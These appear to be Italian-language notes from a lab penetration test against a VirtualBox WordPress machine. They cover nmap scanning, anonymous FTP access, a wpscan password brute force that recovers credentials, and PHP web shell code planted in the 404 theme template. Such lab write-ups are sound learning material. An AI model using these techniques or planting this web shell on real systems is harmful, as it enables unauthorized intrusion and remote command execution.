Step:

1. sudo nmap -sn 192.168.1.0/24  // scansiono la rete per vedere cosa c'è collegato
    
    Risultato:
    Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 16:00 +0200
    Nmap scan report for pfSense.home.arpa (192.168.1.1)
    Host is up (0.00081s latency).
    MAC Address: 08:00:27:10:EF:AE (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.1.12
    Host is up (0.00086s latency).
    MAC Address: 08:00:27:C2:AD:6A (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.1.10
    Host is up.
    Nmap done: 256 IP addresses (3 hosts up) scanned in 2.41 seconds

    viene riconosciuta la macchina kali da cui lancio il comando 192.168.1.10
    la pfSense che fa da router 192.168.1.1
    la macchina da attaccare 192.168.1.12

2. sudo nmap -sS -sV -p- -T5 192.168.1.12 // cerco i servizi e versioni aperte sulla macchina da attaccare

    Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 16:04 +0200
    Nmap scan report for 192.168.1.12
    Host is up (0.000065s latency).
    Not shown: 65532 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 2.3.5
    22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
    MAC Address: 08:00:27:C2:AD:6A (Oracle VirtualBox virtual NIC)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.52 seconds

3. ftp 192.168.1.12 // ho visto i lservizio ftp aperto spesso il piu debole provo ad attaccarlo
    
    Connected to 192.168.1.12.
    220 (vsFTPd 2.3.5)
    Name (192.168.1.12:kali):

    vedo che mi lascia entrare

    provo a entrare con anonymous e mi lascia loggarmi

    dentrato dentro public e ho trovato il file users.txt.bk

4. lanciato get users.txt.bk

    ─(kali㉿kali)-[~]
    └─$ cat users.txt.bk      
    abatchy
    john
    mai
    anne
    doomguy

5. mi da errore hydra

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-17 16:30:05
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 86066394 login tries (l:6/p:14344399), ~21516599 tries per task
    [DATA] attacking ssh://192.168.1.12:22/
    [ERROR] target ssh://192.168.1.12:22/ does not support password authentication (method reply 4).

6. lancio il comando curl http://192.168.1.12/

    ┌──(kali㉿kali)-[~]
    └─$ curl http://192.168.1.12/
    <html><body><h1>It works!</h1>
    <p>This is the default web page for this server.</p>
    <p>The web server software is running but no content has been added, yet.</p>
    </body></html>

7. wpscan --url http://192.168.1.12/backup_wordpress --enumerate u 

    └─$ wpscan --url http://192.168.1.12/backup_wordpress --enumerate u 
    _______________________________________________________________
            __          _______   _____
            \ \        / /  __ \ / ____|
            \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                \/  \/   |_|    |_____/ \___|\__,_|_| |_|

            WordPress Security Scanner by the WPScan Team
                            Version 3.8.28
                                
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________

    [i] Updating the Database ...
    [i] Update completed.

    [+] URL: http://192.168.1.12/backup_wordpress/ [192.168.1.12]
    [+] Started: Fri Jul 17 16:44:49 2026

    Interesting Finding(s):

    [+] Headers
    | Interesting Entries:
    |  - Server: Apache/2.2.22 (Ubuntu)
    |  - X-Powered-By: PHP/5.3.10-1ubuntu3.26
    | Found By: Headers (Passive Detection)
    | Confidence: 100%

    [+] XML-RPC seems to be enabled: http://192.168.1.12/backup_wordpress/xmlrpc.php
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%
    | References:
    |  - http://codex.wordpress.org/XML-RPC_Pingback_API
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
    |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

    [+] WordPress readme found: http://192.168.1.12/backup_wordpress/readme.html
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%

    [+] The external WP-Cron seems to be enabled: http://192.168.1.12/backup_wordpress/wp-cron.php
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 60%
    | References:
    |  - https://www.iplocation.net/defend-wordpress-from-ddos
    |  - https://github.com/wpscanteam/wpscan/issues/1299

    [+] WordPress version 4.5 identified (Insecure, released on 2016-04-12).
    | Found By: Rss Generator (Passive Detection)
    |  - http://192.168.1.12/backup_wordpress/?feed=rss2, <generator>https://wordpress.org/?v=4.5</generator>
    |  - http://192.168.1.12/backup_wordpress/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.5</generator>

    [+] WordPress theme in use: twentysixteen
    | Location: http://192.168.1.12/backup_wordpress/wp-content/themes/twentysixteen/
    | Last Updated: 2026-05-20T00:00:00.000Z
    | Readme: http://192.168.1.12/backup_wordpress/wp-content/themes/twentysixteen/readme.txt
    | [!] The version is out of date, the latest version is 3.8
    | Style URL: http://192.168.1.12/backup_wordpress/wp-content/themes/twentysixteen/style.css?ver=4.5
    | Style Name: Twenty Sixteen
    | Style URI: https://wordpress.org/themes/twentysixteen/
    | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead wi...
    | Author: the WordPress team
    | Author URI: https://wordpress.org/
    |
    | Found By: Css Style In Homepage (Passive Detection)
    |
    | Version: 1.2 (80% confidence)
    | Found By: Style (Passive Detection)
    |  - http://192.168.1.12/backup_wordpress/wp-content/themes/twentysixteen/style.css?ver=4.5, Match: 'Version: 1.2'

    [+] Enumerating Users (via Passive and Aggressive Methods)
    Brute Forcing Author IDs - Time: 00:00:00 <============================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

    [i] User(s) Identified:

    [+] john
    | Found By: Author Posts - Display Name (Passive Detection)
    | Confirmed By:
    |  Rss Generator (Passive Detection)
    |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
    |  Login Error Messages (Aggressive Detection)

    [+] admin
    | Found By: Author Posts - Display Name (Passive Detection)
    | Confirmed By:
    |  Rss Generator (Passive Detection)
    |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
    |  Login Error Messages (Aggressive Detection)

    [!] No WPScan API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

    [+] Finished: Fri Jul 17 16:44:52 2026
    [+] Requests Done: 71
    [+] Cached Requests: 6
    [+] Data Sent: 18.073 KB
    [+] Data Received: 24.057 MB
    [+] Memory used: 205.477 MB
    [+] Elapsed time: 00:00:02


8. wpscan --url http://192.168.1.12/backup_wordpress --usernames john --passwords /usr/share/wordlists/rockyou.txt

    [i] No Config Backups Found.

    [+] Performing password attack on Xmlrpc against 1 user/s
    [SUCCESS] - john / enigma                                                                                                                                                                                 
    Trying john / panasonic Time: 00:03:13 <                                                                                                                         > (2515 / 14346907)  0.01%  ETA: ??:??:??

    [!] Valid Combinations Found:
    | Username: john, Password: enigma

    [!] No WPScan API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

    [+] Finished: Fri Jul 17 16:51:24 2026
    [+] Requests Done: 2658
    [+] Cached Requests: 35
    [+] Data Sent: 1.387 MB
    [+] Data Received: 1.605 MB
    [+] Memory used: 303.293 MB
    [+] Elapsed time: 00:03:17

    Username: john
    password: enigma

9. http://192.168.1.12/backup_wordpress/wp-admin/ // da mettere su firewall

    entro con le credenziali appena trovate

    appereance->Editor->404 Templates

    inserisco questo codice per inserire codice malevolo
        <?php

        /**
        * The template for displaying 404 pages (not found)
        *
        * @package WordPress
        * @subpackage Twenty_Sixteen
        * @since Twenty Sixteen 1.0
        */

        get_header(); ?>

        <div id="primary" class="content-area">
            <main id="main" class="site-main" role="main">

                <section class="error-404 not-found">
                    <header class="page-header">
                        <h1 class="page-title"><?php _e( 'Oops! That page can&rsquo;t be found.', 'twentysixteen' ); ?></h1>
                    </header><!-- .page-header -->

                    <div class="page-content">
                        <?php
                        if(isset($_GET['cmd'])){
                            echo "<pre>";
                            system($_GET['cmd']);
                            echo "</pre>";
                        }
                        ?>
                    </div><!-- .page-content -->
                </section><!-- .error-404 -->

            </main><!-- .site-main -->

            <?php get_sidebar( 'content-bottom' ); ?>

        </div><!-- .content-area -->

        <?php get_sidebar(); ?>
        <?php get_footer(); ?>
